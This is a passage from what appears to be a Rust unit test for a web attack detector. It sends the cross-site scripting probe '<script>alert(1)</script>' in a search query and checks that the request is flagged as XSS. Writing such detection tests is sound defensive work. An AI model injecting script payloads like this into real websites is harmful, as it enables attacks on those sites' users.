                client_ip,
                &http::Method::GET,
                "/search",
                Some("q=<script>alert(1)</script>"),
                &make_headers(),
                None,
            )
            .await;
        assert!(result.0.is_some());
        let detected = result.0.unwrap();
        assert!(matches!(detected.attack_type, AttackType::Xss));
    }
}
